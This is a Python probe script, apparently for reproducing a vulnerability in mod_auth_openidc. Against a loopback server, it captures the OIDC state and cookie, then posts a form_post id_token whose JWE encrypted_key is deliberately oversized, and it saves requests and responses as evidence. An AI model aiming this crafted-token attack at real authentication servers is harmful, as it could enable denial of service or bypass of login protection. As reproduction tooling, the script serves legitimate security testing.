#!/usr/bin/env python3
"""Loopback authorization-request + form_post id_token probe with oversized encrypted_key."""
import hashlib
import os
import re
import socket
import sys
import urllib.parse

import probe

HOST = "127.0.0.1"
PORT = 18443
UA = "w2-idtoken-probe"
CLIENT_SECRET = "w2-loopback-secret-0123456789"
EVIDENCE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")


def request(req):
    with socket.create_connection((HOST, PORT), timeout=10) as s:
        s.sendall(req)
        chunks = []
        while True:
            data = s.recv(4096)
            if not data:
                break
            chunks.append(data)
    return b"".join(chunks)


def save(name, data):
    mode = "wb" if isinstance(data, bytes) else "w"
    with open(os.path.join(EVIDENCE, name), mode) as f:
        f.write(data)


def main():
    scenario = sys.argv[1]
    ek_len = {"oversized": 56, "valid": 40}[scenario]
    tok = probe.token(ek_len)

    get = (b"GET /private HTTP/1.1\r\n"
           b"Host: 127.0.0.1:18443\r\n"
           b"User-Agent: " + UA.encode() + b"\r\n"
           b"Accept: text/html\r\n"
           b"Connection: close\r\n\r\n")
    get_resp = request(get)
    save("idtoken-get-response-" + scenario + ".bin", get_resp)
    head = get_resp.split(b"\r\n\r\n", 1)[0].decode("ascii", "replace")
    m = re.search(r"[?&]state=([^&\s\"]+)", head)
    c = re.search(r"Set-Cookie:\s*(mod_auth_openidc_state_[^;]+)", head, re.I)
    if not m or not c:
        raise SystemExit("NO_STATE_OR_COOKIE: " + repr(head[:800]))
    state = urllib.parse.unquote(m.group(1))
    cookie = c.group(1)
    save("idtoken-state-" + scenario + ".txt",
         "state=%s\ncookie=%s\nderived_kek=%s\n" %
         (state, cookie, hashlib.sha256(CLIENT_SECRET.encode()).digest()[:16].hex()))

    body = urllib.parse.urlencode({
        "state": state,
        "id_token": tok,
        "response_mode": "form_post",
    }).encode("ascii")
    post = (b"POST /redirect_uri HTTP/1.1\r\n"
            b"Host: 127.0.0.1:18443\r\n"
            b"User-Agent: " + UA.encode() + b"\r\n"
            b"Cookie: " + cookie.encode("ascii") + b"\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: " + str(len(body)).encode() + b"\r\n"
            b"Connection: close\r\n\r\n" + body)
    save("idtoken-request-" + scenario + ".bin", post)
    save("idtoken-token-" + scenario + ".txt", tok + "\n")
    resp = request(post)
    save("idtoken-response-" + scenario + ".bin", resp)
    print("SCENARIO=%s EK_RAW_LEN=%d STATE_LEN=%d" % (scenario, ek_len, len(state)))
    print("GET_STATUS=" + repr(get_resp.split(b"\r\n", 1)[0]))
    print("POST_STATUS=" + repr(resp.split(b"\r\n", 1)[0]))


if __name__ == "__main__":
    main()
